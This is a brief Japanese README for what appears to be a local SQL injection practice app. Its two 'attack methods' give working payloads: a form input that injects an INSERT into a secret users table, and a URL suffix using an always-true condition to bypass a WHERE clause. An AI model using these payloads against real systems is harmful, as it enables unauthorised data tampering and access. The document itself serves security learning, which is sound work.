# sqlInjection
# 使い方
# yarn installしてください
# 攻撃方法 1
# ','');insert into secret_usesrs (name, email) values ('injection', 'injection')--
# を書き込みのところに入力しボタンをクリック
# 攻撃方法 2
# hoge' AND email = 'name' OR 'x' = 'x';--
# をlocalhost:xxxx/posts/以降のurlに貼り付け